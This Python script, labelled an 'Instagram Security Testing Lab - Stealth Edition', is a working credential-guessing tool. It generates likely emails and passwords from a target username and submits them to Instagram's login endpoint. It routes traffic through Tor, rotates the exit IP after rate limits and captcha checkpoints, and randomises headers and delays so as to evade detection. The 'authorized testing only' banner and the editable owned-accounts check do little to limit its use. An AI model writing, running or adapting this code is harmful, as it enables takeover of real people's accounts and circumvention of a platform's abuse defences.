#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Instagram Security Testing Lab - Stealth Edition
WARNING: For authorized security testing only
"""

import random
import time
import requests
import json
from stem import Signal
from stem.control import Controller
import socket
import socks
import hashlib
import os
import sys
import threading
from collections import defaultdict

class InstagramStealthLab:
    def __init__(self, target_username, owned_accounts):
        if target_username not in owned_accounts:
            sys.exit("Error: Unauthorized testing account")
            
        self.target_username = target_username
        self.owned_accounts = owned_accounts
        self.tor_proxy = 'socks5://localhost:9050'
        self.base_delay = random.randint(45, 90)
        self.max_attempts = 8
        self.session = self._create_stealth_session()
        self.request_count = 0
        self.captcha_encountered = 0
        
        # Stealth profiles configuration
        self.profiles = {
            "low": {"delay": (30, 60), "retries": 1, "tor": True},
            "medium": {"delay": (60, 120), "retries": 2, "tor": True},
            "high": {"delay": (120, 300), "retries": 1, "tor": True}
        }

    def _create_stealth_session(self):
        """Create session with stealth settings"""
        session = requests.Session()
        session.headers.update(self._generate_headers())
        session.proxies = {'http': self.tor_proxy, 'https': self.tor_proxy}
        return session

    def _generate_headers(self):
        """Generate realistic headers without detectable patterns"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36'
        ]
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.instagram.com/',
            'X-Requested-With': 'XMLHttpRequest',
            'DNT': '1'
        }

    def _rotate_tor_ip(self):
        """Rotate IP silently"""
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
            time.sleep(10)
        except:
            pass

    def _random_delay(self, min_delay, max_delay):
        """Random delay without patterns"""
        time.sleep(random.uniform(min_delay, max_delay))

    def _generate_credentials(self):
        """Generate credentials without obvious patterns"""
        name_parts = self.target_username.lower().split('_')
        domains = ['gmail.com', 'yahoo.com', 'protonmail.com']
        variations = []
        
        if name_parts:
            first = name_parts[0]
            last = name_parts[-1] if len(name_parts) > 1 else ''
            
            for domain in domains:
                variations.extend([
                    f"{first}.{last}@{domain}" if last else f"{first}@{domain}",
                    f"{first[0]}{last}@{domain}" if last else f"{first}123@{domain}",
                    f"{first}{random.randint(1,99)}@{domain}"
                ])
        
        passwords = [
            f"{first}{last}" if last else first,
            f"{first.capitalize()}{random.randint(1, 999)}",
            f"{first.lower()}_{last.upper()}" if last else f"{first.lower()}!123",
            "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890!@#$%", k=8))
        ]
        
        return variations, passwords

    def _check_2fa(self, response):
        """Check for 2FA discreetly"""
        try:
            return 'two_factor_required' in response.text
        except:
            return False

    def _make_request(self, url, data):
        """Make stealth request"""
        try:
            self._random_delay(self.base_delay * 0.8, self.base_delay * 1.2)
            
            if self.request_count % 3 == 0:
                self._rotate_tor_ip()
                self.session = self._create_stealth_session()
            
            response = self.session.post(
                url,
                data=data,
                timeout=30,
                allow_redirects=False
            )
            
            self.request_count += 1
            
            if response.status_code == 429:
                self._rotate_tor_ip()
                return None
                
            return response
            
        except Exception:
            return None

    def stealth_login(self, email, password, profile="medium"):
        """Stealth login attempt"""
        config = self.profiles.get(profile, self.profiles["medium"])
        
        login_data = {
            'username': email,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        for _ in range(config["retries"]):
            response = self._make_request(
                'https://www.instagram.com/accounts/login/ajax/',
                login_data
            )
            
            if not response:
                continue
                
            if 'checkpoint' in response.text:
                self.captcha_encountered += 1
                if self.captcha_encountered > 2:
                    self._rotate_tor_ip()
                    self.captcha_encountered = 0
                continue
                
            if response.status_code == 200:
                if 'authenticated": true' in response.text:
                    return True
                if self._check_2fa(response):
                    return "2FA"
                    
            self._random_delay(*config["delay"])
            
        return False

    def run_stealth_test(self):
        """Execute complete stealth test"""
        emails, passwords = self._generate_credentials()
        results = []
        
        for email in emails[:3]:  # Limit combinations
            for password in passwords:
                result = self.stealth_login(email, password)
                results.append({
                    "email": self._hash(email),
                    "password": self._hash(password),
                    "result": result,
                    "time": time.strftime("%Y-%m-%d %H:%M:%S")
                })
                
                if result is True:
                    break
                    
        self._save_results(results)
        return results

    def _hash(self, data):
        """Hash sensitive data"""
        return hashlib.sha256(data.encode()).hexdigest()[:10]

    def _save_results(self, results):
        """Save results to discreet file"""
        filename = f"ig_test_{int(time.time())}.data"
        with open(filename, 'w') as f:
            json.dump(results, f)
            
        os.chmod(filename, 0o600)  # Restrict permissions

def main():
    print("Initializing testing mode...")
    
    # Configuration - ADD YOUR OWNED ACCOUNTS HERE
    OWNED_ACCOUNTS = ["your_test_account1", "your_test_account2"]
    
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} username")
        print(f"Allowed accounts: {', '.join(OWNED_ACCOUNTS)}")
        sys.exit(1)
        
    target = sys.argv[1]
    
    lab = InstagramStealthLab(target, OWNED_ACCOUNTS)
    results = lab.run_stealth_test()
    
    print("Test completed. Results saved to file.")

if __name__ == "__main__":
    main()
